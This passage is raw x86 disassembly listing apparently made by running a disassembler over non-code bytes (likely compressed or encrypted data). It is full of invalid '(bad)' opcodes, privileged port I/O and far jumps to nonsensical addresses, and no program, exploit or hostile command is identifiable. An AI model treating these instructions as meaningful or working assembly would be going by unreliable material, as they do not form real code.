  41528d:	inc    ebp
  41528e:	test   BYTE PTR [ebx],dh
  415290:	aaa    
  415291:	hlt    
  415292:	in     eax,0xa0
  415294:	inc    edi
  415295:	mov    ebx,0x202c0afc
  41529a:	jae    0x415249
  41529c:	add    bl,cl
  41529e:	test   al,0xee
  4152a0:	stos   BYTE PTR es:[edi],al
  4152a1:	cdq    
  4152a2:	mov    ds,WORD PTR [edi+eax*8+0x46]
  4152a6:	jnp    0x415282
  4152a8:	xchg   esp,eax
  4152a9:	lock add eax,0x76cdb4bc
  4152af:	icebp  
  4152b0:	xchg   ebx,eax
  4152b1:	(bad)  
  4152b3:	(bad)  
  4152b5:	sub    ebp,DWORD PTR [esi+0x39]
  4152b8:	out    dx,al
  4152b9:	stos   BYTE PTR es:[edi],al
  4152ba:	ss sbb al,0x35
  4152bd:	xor    dl,BYTE PTR [eax]
  4152bf:	cmc    
  4152c0:	sti    
  4152c1:	sbb    ecx,DWORD PTR [ebx+0x79489d4b]
  4152c7:	mov    dh,0xb2
  4152c9:	mov    dh,0xe6
  4152cb:	jns    0x415259
  4152cd:	xchg   ebx,eax
  4152ce:	lock mov ebx,0x20178ed4
  4152d4:	dec    ecx
  4152d5:	bound  ebx,QWORD PTR [edx]
  4152d7:	nop
  4152d8:	push   es
  4152d9:	push   0x8cfafabd
  4152de:	and    DWORD PTR [eax+0x25],esp
  4152e1:	shl    BYTE PTR ds:0xf66e95cc,1
  4152e7:	sbb    eax,0x1c09d92d
  4152ec:	fisttp DWORD PTR [esi]
  4152ee:	mul    DWORD PTR [ecx+0x2feefa38]
  4152f4:	test   BYTE PTR [ebp-0x566391a5],bl
  4152fa:	pop    eax
  4152fb:	es fdecstp 
  4152fe:	lea    ebp,[eax]
  415300:	je     0x415341
  415302:	repz and esi,ebx
  415305:	mov    bh,0xd7
  415307:	loopne 0x4152e2
  415309:	pop    ecx
  41530a:	loop   0x415341
  41530c:	or     edx,0x228d74a9
  415312:	(bad)  
  415313:	ja     0x4152b0
  415315:	mov    dl,0xbc
  415317:	mov    esi,0x2dc977ce
  41531c:	scas   eax,DWORD PTR es:[edi]
  41531d:	call   0xd36c:0xda15901e
  415324:	jp     0x4152b2
  415326:	dec    ecx
  415327:	sub    ecx,DWORD PTR [eax]
  415329:	fstp   QWORD PTR [edx+0x43b5f08]
  41532f:	outs   dx,BYTE PTR ds:[esi]
  415330:	cmp    DWORD PTR [ecx-0x77],esi
  415333:	pushf  
  415334:	aaa    
  415335:	cmp    edx,DWORD PTR [eax-0x78389291]
  41533b:	out    dx,eax
  41533c:	iret   
  41533d:	out    dx,eax
  41533e:	mov    WORD PTR [edx],es
  415340:	or     BYTE PTR [ecx-0xb11130],0xc1
  415347:	stos   DWORD PTR es:[edi],eax
  415348:	cmp    ebp,DWORD PTR [esp+ecx*1+0x6b]
  41534c:	rep lods al,BYTE PTR ds:[esi]
  41534e:	call   0xe842:0xddc72b9d
  415355:	test   DWORD PTR [ebp+0x4f],ebx
  415358:	sbb    ebp,DWORD PTR [ebx+edi*8-0x2]
  41535c:	dec    ebp
  41535d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41535f:	pop    ebx
  415360:	jne    0x415366
  415362:	scas   eax,DWORD PTR es:[edi]
  415363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415364:	fist   WORD PTR [ecx+ecx*8]
  415367:	or     BYTE PTR [ecx],ch
  415369:	std    
  41536a:	cli    
  41536b:	add    edi,DWORD PTR [bx-0x3a]
  41536f:	add    BYTE PTR [ebp+0x1717033f],al
  415375:	xchg   edx,eax
  415376:	adc    edx,DWORD PTR [ecx-0x77d02354]
  41537c:	mov    ebp,0xa58feae0
  415381:	out    0x8a,eax
  415383:	sbb    ebx,DWORD PTR [ebx+0x38]
  415386:	xor    ebx,DWORD PTR [ecx+0x61176492]
  41538c:	mov    eax,0xbe7e1024
  415391:	ja     0x4153c9
  415393:	je     0x41534d
  415395:	push   ebx
  415396:	jo     0x4153a8
  415398:	adc    ecx,esp
  41539a:	xor    eax,0x2fd3a793
  41539f:	mov    fs,ebx
  4153a1:	or     DWORD PTR [ebp+0x6dcabd15],ebx
  4153a7:	cmp    BYTE PTR [edx],dl
  4153a9:	dec    ebx
  4153aa:	jb     0x415389
  4153ac:	sbb    edi,ebp
  4153ae:	add    cl,dl
  4153b0:	in     al,dx
  4153b1:	or     bh,BYTE PTR [esi-0x54]
  4153b4:	and    al,0xdd
  4153b6:	and    ah,BYTE PTR [ebx+0x43b38558]
  4153bc:	je     0x415402
  4153be:	test   BYTE PTR [edi+0x1dabdab3],0x8e
  4153c5:	pop    ebp
  4153c6:	repz dec ebp
  4153c8:	stc    
  4153c9:	mov    DWORD PTR [ebx-0x6a3e3874],esp
  4153cf:	xor    al,0x7a
  4153d1:	int    0xf5
  4153d3:	mov    al,ds:0x593bb579
  4153d8:	inc    edi
  4153d9:	jo     0x41537d
  4153db:	js     0x41540f
  4153dd:	push   edi
  4153de:	int3   
  4153df:	iret   
  4153e0:	jae    0x41539a
  4153e2:	cmc    
  4153e3:	lock add esp,edx
  4153e6:	xchg   edi,edx
  4153e8:	loopne 0x4153c6
  4153ea:	lods   al,BYTE PTR ds:[esi]
  4153eb:	xchg   edx,eax
  4153ec:	stos   BYTE PTR es:[edi],al
  4153ed:	dec    edx
  4153ee:	mov    dh,BYTE PTR [eax+0x45]
  4153f1:	shl    dh,1
  4153f3:	jb     0x4153ed
  4153f5:	fstp   TBYTE PTR [edx]
  4153f7:	jge    0x4153cb
  4153f9:	loop   0x4153d9
  4153fb:	add    dl,bh
  4153fd:	int3   
  4153fe:	fcom   DWORD PTR [esi-0x16]
  415401:	(bad)
  415405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415406:	mov    esi,0x463c4868
  41540b:	mov    dl,dh
  41540d:	je     0x4153a2
  41540f:	cmp    cl,BYTE PTR [edi-0x496ffe43]
  415415:	push   es
  415416:	sub    eax,0x26d3a34a
  41541b:	mov    eax,0x1b186713
  415420:	cmp    dl,BYTE PTR [esi-0x7b]
  415423:	rol    DWORD PTR [esp+ecx*8+0x2c],0xb6
  415428:	into   
  415429:	sub    BYTE PTR ds:0x3a8873d1,0x33
  415430:	sbb    dl,BYTE PTR [ebx]
  415432:	mov    ecx,0x6bbac055
  415437:	xchg   ecx,eax
  415438:	and    eax,0x86989b17
  41543d:	fiadd  DWORD PTR [eax]
  41543f:	pusha  
  415440:	les    eax,FWORD PTR [edi-0x325f5571]
  415446:	jae    0x4154a8
  415448:	jb     0x41546a
  41544a:	in     eax,dx
  41544b:	sub    al,0xdc
  41544d:	cmp    esp,DWORD PTR [edi-0x3e]
  415450:	idiv   BYTE PTR [esi-0x3c]
  415453:	mov    edx,0xf138ecd7
  415458:	and    DWORD PTR [ebp-0x7f],ecx
  41545b:	shl    BYTE PTR [ecx-0x23f62827],0xa0
  415462:	xchg   ebx,eax
  415463:	mov    ebp,0xe5808c5c
  415468:	iret   
  415469:	jge    0x41541d
  41546b:	dec    esp
  41546c:	call   DWORD PTR [eax-0x34c4593d]
  415472:	loope  0x415447
  415474:	mov    cl,0x54
  415476:	fistp  WORD PTR [esi+0x2d]
  415479:	lock dec ebp
  41547b:	call   0x4bb2:0x4d9a4af4
  415482:	rol    BYTE PTR [ebp+edx*8-0x17fea3c],1
  415489:	das    
  41548a:	adc    DWORD PTR [ebp+0x42],eax
  41548d:	imul   ebp,DWORD PTR [eax+eax*1-0x7a],0xdb141c84
  415495:	lods   al,BYTE PTR ds:[esi]
  415496:	hlt    
  415497:	add    bl,BYTE PTR fs:[eax+edx*8]
  41549b:	addr16 stc 
  41549d:	loopne 0x4154ad
  41549f:	jno    0x415473
  4154a1:	enter  0xcbec,0x1e
  4154a5:	ja     0x4154ca
  4154a7:	jnp    0x4154ea
  4154a9:	add    dh,dl
  4154ab:	sahf   
  4154ac:	ins    DWORD PTR es:[edi],dx
  4154ad:	fst    QWORD PTR [edx+eiz*2-0x50]
  4154b1:	loopne 0x415519
  4154b3:	das    
  4154b4:	pop    eax
  4154b5:	mov    edi,gs
  4154b7:	aas    
  4154b8:	ins    BYTE PTR es:[edi],dx
  4154b9:	fs mov edx,0xe2830c58
  4154bf:	jmp    0x510491f2
  4154c4:	sbb    DWORD PTR [edi+eax*1+0x7431255d],0xffffffc2
  4154cc:	inc    ebx
  4154cd:	loop   0x415457
  4154cf:	jmp    0x174ab113
  4154d4:	(bad)
  4154d7:	nop
  4154d8:	out    dx,al
  4154d9:	bound  ebx,QWORD PTR [eax]
  4154db:	mov    eax,?
  4154dd:	retf   
  4154de:	dec    edi
  4154df:	imul   DWORD PTR [esi-0x72569ae6]
  4154e5:	xor    eax,0x9ba9f001
  4154ea:	sub    DWORD PTR [si+0x394f],edi
  4154ef:	mov    es,WORD PTR [eax-0x39]
  4154f2:	fst    DWORD PTR [edx+0x17952ddf]
  4154f8:	and    al,0xe9
  4154fa:	sbb    ebx,DWORD PTR [ecx+0x43]
  4154fd:	push   es
  4154fe:	jmp    0x41551a
  415500:	dec    edi
  415501:	push   es
  415502:	outs   dx,DWORD PTR ds:[esi]
  415503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415504:	mov    dh,0x4f
  415506:	jne    0x4154f5
  415508:	scas   al,BYTE PTR es:[edi]
  415509:	cmp    esi,DWORD PTR [edx-0x76]
  41550c:	cmp    al,0xfb
  41550e:	in     al,dx
  41550f:	ja     0x415499
  415511:	cmp    edi,edi
  415513:	push   ebp
  415514:	inc    esp
  415515:	fidivr WORD PTR [edi]
  415517:	ss xchg edi,eax
  415519:	mov    esp,0xdc996299
  41551e:	mov    ebp,0x5a498da
  415523:	retf   
  415524:	les    ebp,FWORD PTR [edi]
  415526:	imul   edx,DWORD PTR [ebx-0x7b],0x5955d0e0
  41552d:	fwait
  41552e:	and    edi,ebx
  415530:	push   ecx
  415531:	cmp    al,0xa
  415533:	adc    BYTE PTR ds:0xc2f64d83,bh
  415539:	mov    al,ds:0x5d76ab82
  41553e:	test   al,0x17
  415540:	ins    BYTE PTR es:[edi],dx
  415541:	jns    0x4154de
  415543:	add    al,0x2
  415545:	and    eax,0x47f6a5c8
  41554a:	mov    ds:0x3fbc7353,al
  41554f:	or     al,0xfd
  415551:	xor    al,0x25
  415553:	mov    WORD PTR [esi-0x18],gs
  415556:	mov    eax,ds:0xd4990578
  41555b:	out    0xa,eax
  41555d:	ss aas 
  41555f:	jle    0x4155cc
  415561:	retf   
  415562:	and    BYTE PTR [edx-0x3d],0xdc
  415566:	xchg   ebp,eax
  415567:	dec    esi
  415568:	outs   dx,BYTE PTR ds:[esi]
  415569:	outs   dx,DWORD PTR ds:[esi]
  41556a:	scas   eax,DWORD PTR es:[edi]
  41556b:	fstp   st(5)
  41556d:	pop    ss
  41556e:	push   ebx
  41556f:	pop    ss
  415570:	push   es
  415571:	or     esi,edx
  415573:	mov    ds:0x229d87f3,al
  415578:	mov    ?,WORD PTR ds:0x1299b349
  41557e:	test   eax,0x19b9014e
  415583:	gs add eax,0x4d413f34
  415589:	shl    BYTE PTR [ebp-0x501ccdfa],1
  41558f:	out    dx,al
  415590:	or     eax,0x128c4bb8
  415595:	and    eax,0x89fb57c
  41559a:	jp     0x41551e
  41559c:	mov    edx,0x2e778ec
  4155a1:	mov    esi,0xd90cdf42
  4155a6:	in     eax,dx
  4155a7:	aaa    
  4155a8:	push   esp
  4155a9:	hlt    
  4155aa:	test   DWORD PTR [esi-0x118b7d87],esp
  4155b0:	dec    ebp
  4155b1:	bound  ecx,QWORD PTR [edi-0x31444c5]
  4155b7:	add    eax,0x9bce81d6
  4155bc:	sbb    al,0x76
  4155be:	mov    dl,0x3
  4155c0:	push   ds
  4155c1:	push   ss
  4155c2:	out    dx,eax
  4155c3:	push   edx
  4155c4:	sub    esi,DWORD PTR [esi-0x3dda38d4]
  4155ca:	dec    esi
  4155cb:	les    edx,FWORD PTR [edi+0x6286c2a3]
  4155d1:	retf   0x9db7
  4155d4:	loope  0x415564
  4155d6:	cmp    cl,bl
  4155d8:	cmc    
  4155d9:	sub    al,0x11
  4155db:	cmp    BYTE PTR [eax+esi*4-0x10],dl
  4155df:	stc    
  4155e0:	(bad)  
  4155e1:	retf   0xdc9f
  4155e4:	sbb    al,0x9d
  4155e6:	and    cl,ch
  4155e8:	mov    esi,0x3d539ea2
  4155ed:	lahf   
  4155ee:	pop    es
  4155ef:	mov    edx,0x9585f97d
  4155f4:	cmp    DWORD PTR [edi+ebp*4],0x618b4f7e
  4155fb:	sti    
  4155fc:	pop    esi
  4155fd:	pushf  
  4155fe:	sub    eax,0x1e47befe
  415603:	rcl    BYTE PTR [edx+0x4b469aa7],0xa1
  41560a:	sub    eax,0x7bf55ddf
  41560f:	cli    
  415610:	mov    WORD PTR [ecx-0x7802bdca],ss
  415616:	push   0x39
  415618:	hlt    
  415619:	call   0x8187a21a
  41561e:	jns    0x4155bd
  415620:	xchg   esp,eax
  415621:	xchg   ebx,eax
  415622:	arpl   WORD PTR [edi+0x4e],si
  415625:	xchg   ecx,eax
  415626:	mov    al,ds:0xf0939b4a
  41562b:	js     0x41568f
  41562d:	jg     0x4155f9
  41562f:	add    ah,dh
  415631:	jl     0x415684
  415633:	sub    DWORD PTR [edi+0x6a],eax
  415636:	repz aaa 
  415638:	jmp    0x4155da
  41563a:	aaa    
  41563b:	mov    al,0x13
  41563d:	mov    cl,0x64
  41563f:	sar    DWORD PTR [eax+eax*4],1
  415642:	stos   DWORD PTR es:[edi],eax
  415643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415644:	adc    BYTE PTR [edx],bl
  415646:	addr16 pushf 
  415648:	mov    cl,0x8b
  41564a:	sbb    ebp,DWORD PTR [ebx+0xa25cbec]
  415650:	ret    0x17d9
  415653:	and    al,0x39
  415655:	and    BYTE PTR [edi-0x1d1d425b],0xc2
  41565c:	mov    ds:0xd88717d8,eax
  415661:	loop   0x4156c4
  415663:	retf   0x9551
  415666:	mov    ecx,0x6fae9199
  41566b:	stos   BYTE PTR es:[edi],al
  41566c:	jno    0x415681
  41566e:	push   esi
  41566f:	mov    ebp,0x5b0211b2
  415674:	add    esp,DWORD PTR [eax]
  415676:	mov    ebx,0xd838856e
  41567b:	cmp    BYTE PTR [ebx],ch
  41567d:	rol    DWORD PTR [ebx+0x1c],1
  415680:	aaa    
  415681:	push   eax
  415682:	out    0x62,al
  415684:	cdq    
  415685:	std    
  415686:	cmp    al,0x8c
  415688:	je     0x41563e
  41568a:	sbb    DWORD PTR [edi+ebx*2],edi
  41568d:	arpl   ax,cx
  41568f:	(bad)  
  415691:	stos   DWORD PTR es:[edi],eax
  415692:	xchg   BYTE PTR [esi-0x6a],dh
  415695:	jp     0x4156f2
  415697:	les    edx,FWORD PTR [esi+0x1f]
  41569a:	aas    
  41569b:	dec    ebp
  41569c:	fdiv   DWORD PTR [ebp+0x1]
  41569f:	and    al,0xa6
  4156a1:	outs   dx,BYTE PTR ds:[esi]
  4156a2:	inc    esi
  4156a3:	in     al,dx
  4156a4:	lods   eax,DWORD PTR ds:[esi]
  4156a5:	dec    edx
  4156a6:	mov    eax,ds:0xbb96fc2a
  4156ab:	out    dx,al
  4156ac:	stc    
  4156ad:	push   0x96b94fd9
  4156b2:	stos   DWORD PTR es:[edi],eax
  4156b3:	pop    ebp
  4156b4:	sbb    DWORD PTR [ecx-0xb5b5d72],esi
  4156ba:	repnz cli 
  4156bc:	es cmp al,0x89
  4156bf:	ins    BYTE PTR es:[edi],dx
  4156c0:	scas   al,BYTE PTR es:[edi]
  4156c1:	pop    esp
  4156c2:	std    
  4156c3:	call   0x789ccbf3
  4156c8:	mov    bh,0x79
  4156ca:	push   ecx
  4156cb:	imul   ecx,DWORD PTR [edi],0x6d
  4156ce:	mov    ah,0xa4
  4156d0:	xchg   esi,eax
  4156d1:	js     0x4156e6
  4156d3:	neg    DWORD PTR [eax-0x1c32889]
  4156d9:	sbb    bl,BYTE PTR [ebx]
  4156db:	xor    BYTE PTR [edi+0x11753e79],0x56
  4156e2:	or     BYTE PTR [eax],dh
  4156e4:	cli    
  4156e5:	mov    eax,0xeb84f452
  4156ea:	sbb    bl,BYTE PTR [eax+edi*8-0x10]
  4156ee:	add    BYTE PTR [ecx+0x73],dl
  4156f1:	xchg   ecx,eax
  4156f2:	sbb    al,bl
  4156f4:	sub    esi,0x3b
  4156f7:	sbb    ah,BYTE PTR [ebp-0x4d]
  4156fa:	jo     0x41570f
  4156fc:	or     al,0x13
  4156fe:	jnp    0x415736
  415700:	repnz (bad) 
  415702:	bsr    ebp,DWORD PTR [ebx+0x57]
  415706:	frstor [edx]
  415708:	or     BYTE PTR [ebp-0x8c32783],dh
  41570e:	jnp    0x4156ae
  415710:	push   esp
  415711:	xor    eax,0xe5f522f2
  415716:	lods   eax,DWORD PTR ds:[esi]
  415717:	scas   al,BYTE PTR es:[edi]
  415718:	sub    eax,0xd36304e6
  41571d:	xchg   edi,eax
  41571e:	sahf   
  41571f:	mov    cl,0xf8
  415721:	out    0xd7,al
  415723:	mov    ah,0x8a
  415725:	jae    0x415740
  415727:	ds add al,0x76
  41572a:	jbe    0x4156f2
  41572c:	ret    
  41572d:	in     eax,dx
  41572e:	retf   0xcedc
  415731:	lds    ebp,FWORD PTR [ebp+0x1e4283f8]
  415737:	xor    DWORD PTR ds:0xdbfaf45b,edx
  41573d:	dec    esp
  41573e:	inc    edi
  41573f:	stos   DWORD PTR es:[edi],eax
  415740:	imul   edi
  415742:	add    al,0xf8
  415744:	dec    eax
  415745:	adc    BYTE PTR [ebx-0xa86ee77],0x37
  41574c:	mov    edi,0x25721aed
  415751:	dec    ecx
  415752:	(bad)  
  415753:	shl    bl,1
  415755:	rcr    DWORD PTR [ebx-0x20],0x3a
  415759:	mov    ah,0xf5
  41575b:	call   0x10d8:0x69c75fc
  415762:	xchg   edx,eax
  415763:	pavgb  mm6,QWORD PTR [ebx]
  415766:	add    dl,BYTE PTR [edx+0x32]
  415769:	les    edi,FWORD PTR [ebx+0x73]
  41576c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576d:	adc    eax,0x872edc02
  415772:	or     BYTE PTR [esi+edx*8],0x4f
  415776:	sbb    DWORD PTR [ebx+0x1e52df06],esp
  41577c:	fsub   DWORD PTR [ebp-0x759ef1a2]
  415782:	jg     0x415753
  415784:	mov    bh,BYTE PTR [edx+0x129cd7f3]
  41578a:	adc    ch,BYTE PTR [edx-0x69]
  41578d:	sti    
  41578e:	(bad)  
  41578f:	lds    ebp,FWORD PTR [esi+0x3b5a2faa]
  415795:	in     al,0x75
  415797:	out    0xcd,eax
  415799:	(bad)  
  41579a:	sbb    ecx,DWORD PTR [edx]
  41579c:	pop    ebp
  41579d:	mov    fs,esp
  41579f:	lds    esp,FWORD PTR [edx]
  4157a1:	inc    eax
  4157a2:	mov    dl,0x7f
  4157a4:	xchg   dh,ah
  4157a6:	jmp    0x95da:0xd6c406d1
  4157ad:	je     0x4157df
  4157af:	push   esp
  4157b0:	and    DWORD PTR [ebx],esp
  4157b2:	dec    esp
  4157b3:	or     BYTE PTR [ebp+0x54],cl
  4157b6:	sub    ah,BYTE PTR [esi-0x2a0b6e66]
  4157bc:	sbb    al,0x8d
  4157be:	dec    esi
  4157bf:	and    BYTE PTR [esi+0x4534648e],dl
  4157c5:	mov    ebp,0x2ceff76f
  4157ca:	mov    dh,0xea
  4157cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157cd:	ror    DWORD PTR [ebx],0xe
  4157d0:	mov    ecx,0xdad2f192
  4157d5:	in     al,0xb4
  4157d7:	mov    eax,ds:0x7f54b355
  4157dc:	pushf  
  4157dd:	and    ebx,eax
  4157df:	xchg   BYTE PTR [eax],dl
  4157e1:	xchg   ebx,esp
  4157e3:	fs imul cl
  4157e6:	xchg   DWORD PTR [edi-0x23fda88b],eax
  4157ec:	lods   eax,DWORD PTR ds:[esi]
  4157ed:	fdiv   DWORD PTR [ebx-0x578efe66]
  4157f3:	cmp    eax,0xafe66d55
  4157f8:	lea    esi,[edx+0x5a3e3fea]
  4157fe:	jle    0x415835
  415800:	dec    esi
  415801:	mov    ebp,0x5a69af3e
  415806:	mov    ?,WORD PTR [eax-0x515500a3]
  41580c:	ja     0x41583f
  41580e:	jle    0x41583b
  415810:	add    DWORD PTR [eax-0x6b],edx
  415813:	push   esp
  415814:	out    0x56,eax
  415816:	std    
  415817:	or     ecx,DWORD PTR [ecx+0x28]
  41581a:	cmp    al,0xfb
  41581c:	test   eax,0x94abca2
  415821:	enter  0x9410,0xe1
  415825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415826:	aaa    
  415827:	(bad)  
  415828:	loop   0x4157b7
  41582a:	mov    bl,0x28
  41582c:	(bad)  
  41582d:	sahf   
  41582e:	push   esi
  41582f:	shr    BYTE PTR [ebx],cl
  415831:	xor    BYTE PTR [eax],cl
  415833:	mov    ebp,0xc479c8f
  415838:	repz out 0x8f,al
  41583b:	mov    DWORD PTR [edi+0x5d3730ed],esi
  415841:	sahf   
  415842:	pop    es
  415843:	dec    edi
  415844:	aaa    
  415845:	shl    cl,0x2e
  415848:	ffreep st(1)
  41584a:	push   ebp
  41584b:	std    
  41584c:	mov    al,0x9e
  41584e:	push   ss
  41584f:	cmp    BYTE PTR [ecx-0x63f6801b],ah
  415855:	cdq    
  415856:	cli    
  415857:	cmp    DWORD PTR [esi+edx*2],eax
  41585a:	jo     0x415857
  41585c:	cmp    DWORD PTR [ebp+0x5b],edi
  41585f:	mov    eax,ds:0x981db2ae
  415864:	pop    eax
  415865:	sbb    DWORD PTR [ebx],edi
  415867:	out    0xf5,eax
  415869:	fsubr  st,st(1)
  41586b:	or     dh,BYTE PTR [ebp-0x59d3d4d4]
  415871:	push   esi
  415872:	or     BYTE PTR [edi-0x37],bl
  415875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415876:	mov    bh,BYTE PTR [edx-0x3336e2a2]
  41587c:	dec    ebx
  41587d:	push   ebp
  41587e:	pushf  
  41587f:	cmp    al,0x93
  415881:	xchg   BYTE PTR [edx],al
  415883:	out    0x3b,al
  415885:	push   es
  415886:	jp     0x415898
  415888:	mov    ebp,0x42693f93
  41588d:	add    edx,DWORD PTR [edx+0x70ec06f8]
  415893:	push   edi
  415894:	(bad)  
  415896:	push   ebp
  415897:	rcl    ch,1
  415899:	gs and ebx,esi
  41589c:	xor    eax,0x986292d8
  4158a1:	push   0x12
  4158a3:	mov    al,ds:0x4a5daa68
  4158a8:	imul   BYTE PTR [ebx]
  4158aa:	xor    al,0x7f
  4158ac:	xchg   esp,eax
  4158ad:	pop    esp
  4158ae:	icebp  
  4158af:	pop    ds
  4158b0:	xor    cl,BYTE PTR [ebp+0x54]
  4158b3:	js     0x4158ed
  4158b5:	xchg   BYTE PTR [edi+0x26e84659],bl
  4158bb:	xchg   ecx,eax
  4158bc:	mov    DWORD PTR [ebx+0x1f],ebp
  4158bf:	stos   DWORD PTR es:[edi],eax
  4158c0:	stos   DWORD PTR es:[edi],eax
  4158c1:	push   esp
  4158c2:	sub    BYTE PTR [eax],0x3
  4158c5:	xchg   ebx,eax
  4158c6:	fmul   QWORD PTR [edx*4+0x33ceeb64]
  4158cd:	arpl   bx,ax
  4158cf:	leave  
  4158d0:	jmp    0xad0b:0x9e126fcc
  4158d7:	pushf  
  4158d8:	mov    ah,0xbd
  4158da:	push   eax
  4158db:	mul    BYTE PTR ds:0x40e63933
  4158e1:	xchg   esp,eax
  4158e2:	call   0x8120:0x250c9fcd
  4158e9:	imul   BYTE PTR [ecx+0x60d5b58f]
  4158ef:	xor    al,BYTE PTR [ebp+0x117c4367]
  4158f5:	scas   eax,DWORD PTR es:[edi]
  4158f6:	mov    cs,WORD PTR [edi+0x703ebaff]
  4158fc:	ret    0x5933
  4158ff:	or     DWORD PTR [edx],esp
  415901:	lods   al,BYTE PTR ds:[esi]
  415902:	in     eax,dx
  415903:	dec    ebx
  415904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415905:	stos   BYTE PTR es:[edi],al
  415906:	je     0x415913
  415908:	mov    ecx,0x64af1143
  41590d:	inc    ebx
  41590e:	out    0x0,eax
  415910:	sub    BYTE PTR [edx],ah
  415912:	ss mov esp,0xa6a2cbb6
  415918:	xchg   ebx,eax
  415919:	pop    ss
  41591a:	and    eax,0x6cd8b3aa
  41591f:	cmp    WORD PTR [ebp-0x39],di
  415923:	mov    dl,0xf9
  415925:	(bad)  
  415926:	xor    eax,0x9a0c55b7
  41592b:	pop    esp
  41592c:	lds    esi,FWORD PTR [eax+0x58]
  41592f:	xchg   ebp,eax
  415930:	adc    dh,cl
  415932:	add    al,0x9c
  415934:	scas   al,BYTE PTR es:[edi]
  415935:	jmp    0x415960
  415937:	(bad)  
  415938:	sub    BYTE PTR ds:0x2c3487b0,dh
  41593e:	test   BYTE PTR [ebx],ch
  415940:	lock jns 0x41593c
  415943:	dec    eax
  415944:	icebp  
  415945:	fidiv  WORD PTR [edx]
  415947:	shr    esi,1
  415949:	mov    WORD PTR [esi-0x4a],gs
  41594c:	clc    
  41594d:	leave  
  41594e:	pop    ecx
  41594f:	lea    edi,[ecx+0x37]
  415952:	out    dx,al
  415953:	out    0x61,eax
  415955:	push   ecx
  415956:	mov    edx,0xc1ba72a
  41595b:	adc    dl,BYTE PTR [edi+ecx*1+0x4c]
  41595f:	push   esp
  415960:	mov    edi,0x332efcde
  415965:	icebp  
  415966:	pop    ss
  415967:	mov    cl,0xe0
  415969:	daa    
  41596a:	repz inc ebx
  41596c:	and    al,0x4b
  41596e:	cmp    BYTE PTR [ebp-0x5a],al
  415971:	(bad)  
  415972:	sti    
  415973:	jmp    0xea8a9b05
  415978:	test   eax,0xd58a2307
  41597d:	aad    0x7f
  41597f:	es pop edx
  415981:	lea    edx,ss:[ecx+esi*2-0x23]
  415986:	and    esi,ecx
  415988:	in     al,0x13
  41598a:	out    dx,al
  41598b:	push   0x32e41ab5
  415990:	cmp    eax,DWORD PTR [ebx+0x51]
  415993:	aas    
  415994:	sti    
  415995:	jb     0x4159b2
  415997:	das    
  415998:	mov    edi,0xa3c31e2b
  41599d:	cmp    al,0x8
  41599f:	dec    ebx
  4159a0:	clc    
  4159a1:	leave  
  4159a2:	xchg   ecx,eax
  4159a3:	shl    edx,cl
  4159a5:	fucomi st,st(4)
  4159a7:	(bad)  
  4159a8:	sub    DWORD PTR [edi-0x30],ecx
  4159ab:	mov    ss:0x14a18e8b,al
  4159b1:	imul   ebx,esi,0x550fea6c
  4159b7:	push   cs
  4159b8:	popf   
  4159b9:	ins    BYTE PTR es:[edi],dx
  4159ba:	xlat   BYTE PTR ds:[ebx]
  4159bb:	push   cs
  4159bc:	ins    BYTE PTR es:[edi],dx
  4159bd:	cli    
  4159be:	leave  
  4159bf:	mov    edx,0x6e756280
  4159c4:	push   edx
  4159c5:	in     eax,0x99
  4159c7:	out    0x43,eax
  4159c9:	push   0x35
  4159cb:	scas   al,BYTE PTR es:[edi]
  4159cc:	loopne 0x4159e2
  4159ce:	push   0xffffff93
  4159d0:	test   DWORD PTR [edx-0x66],eax
  4159d3:	fdivr  DWORD PTR [eax+esi*8+0x62]
  4159d7:	adc    al,0x32
  4159d9:	xchg   edi,eax
  4159da:	sbb    dh,bh
  4159dc:	push   edx
  4159dd:	mov    cl,0x7e
  4159df:	cmp    al,0x28
  4159e1:	add    esp,DWORD PTR [ebp+ecx*4+0x3e]
  4159e5:	pop    ebp
  4159e6:	push   cs
  4159e7:	ds dec ebx
  4159e9:	sbb    ebp,DWORD PTR [edi+esi*4-0xa]
  4159ed:	sub    al,al
  4159ef:	pop    ebx
  4159f0:	sub    eax,0xcde2baed
  4159f5:	mov    ch,0xdd
  4159f7:	mov    eax,ds:0x60ab5bb4
  4159fc:	sub    ah,cl
  4159fe:	cmp    eax,0xb3104b1a
  415a03:	out    dx,eax
  415a04:	mov    gs,WORD PTR [ebx+0x7e]
  415a07:	push   ecx
  415a08:	rcr    edx,cl
  415a0a:	fstp   QWORD PTR [edx+ecx*4+0x2f]
  415a0e:	inc    ebx
  415a0f:	inc    esp
  415a10:	dec    edx
  415a11:	xchg   edi,ebx
  415a13:	mov    ds:0x34228584,eax
  415a18:	jecxz  0x4159eb
  415a1a:	or     eax,0x8bc60a5c
  415a1f:	xchg   ah,bh
  415a21:	sbb    DWORD PTR [esi+eiz*1+0xa],esi
  415a25:	xor    eax,0x26bbce8b
  415a2a:	mov    ebx,0xb6421eb3
  415a2f:	mov    dl,0x1d
  415a31:	add    dl,BYTE PTR [ecx]
  415a33:	pop    ebx
  415a34:	adc    DWORD PTR [edx],ebx
  415a36:	and    al,bl
  415a38:	in     al,dx
  415a39:	lods   al,BYTE PTR ds:[esi]
  415a3a:	cmc    
  415a3b:	cmp    DWORD PTR [ebx],esp
  415a3d:	cwde   
  415a3e:	popa   
  415a3f:	enter  0x2d63,0x4d
  415a43:	cmp    BYTE PTR [esi],dh
  415a45:	daa    
  415a46:	pop    edx
  415a47:	sub    DWORD PTR [eax],ebx
  415a49:	icebp  
  415a4a:	add    esi,DWORD PTR [edi]
  415a4c:	popa   
  415a4d:	mov    ecx,0xe2397671
  415a52:	mov    ebx,0xb3ea7b94
  415a57:	add    eax,0x7c7474ab
  415a5c:	adc    al,0xc8
  415a5e:	aam    0xdc
  415a60:	fimul  DWORD PTR ds:0x14d8275f
  415a66:	xchg   ebp,eax
  415a67:	inc    ebp
  415a68:	stc    
  415a69:	mov    bh,0x27
  415a6b:	mov    dl,0xdd
  415a6d:	pop    eax
  415a6e:	sar    bl,0x62
  415a71:	push   eax
